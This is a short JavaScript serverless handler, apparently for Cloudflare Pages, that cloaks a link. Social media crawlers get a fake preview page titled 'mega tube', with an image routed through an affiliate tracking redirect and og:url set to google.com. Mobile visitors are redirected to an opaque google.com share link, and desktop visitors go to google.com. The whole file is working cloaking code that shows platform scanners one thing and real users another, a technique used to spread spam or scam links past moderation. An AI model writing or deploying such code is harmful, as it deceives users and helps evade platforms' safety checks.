export async function onRequest(context) {
  const request = context.request;
  const userAgent = request.headers.get('user-agent') || '';

  // 1. Check for Social Media Crawlers / Bots
  const isSocialBot = /facebookexternalhit|Facebot|Twitterbot|Pinterest|LinkedInBot|WhatsApp|TelegramBot/i.test(userAgent);

  if (isSocialBot) {
    const htmlContent = `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Welcome</title>
    <meta property="og:title" content="❤️mega tube 🧡">
    <meta property="og:description" content="">
    <meta property="og:image" content="https://go.skimresources.com/?id=130832X1595851&isjs=1&jv=15.7.1&sref=https%3A%2F%2Fwww.vwvortex.com%2Fthreads%2Fmk7-r-faults-after-brake-work-and-battery-replacement.9593210%2F&url=https%3A%2F%2Fibb.co%2Fn4prvdB&xs=1&xtz=-300&xuuid=092693986ae9cfb83808f35525fe4cda&xjsf=other_click__auxclick%20%5B2%5D">
    <meta property="og:url" content="https://www.google.com">
    <meta property="og:type" content="website">
</head>
<body>
</body>
</html>`;

    return new Response(htmlContent, {
      headers: { 'content-type': 'text/html;charset=UTF-8' },
    });
  }

  // 2. Check for Mobile Users
  const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);

  if (isMobile) {
    return Response.redirect("https://www.google.com/share.google?q=BSN8Os0U4KWtt5cdN", 302);
  } else {
    return Response.redirect("https://www.google.com", 302);
  }
}
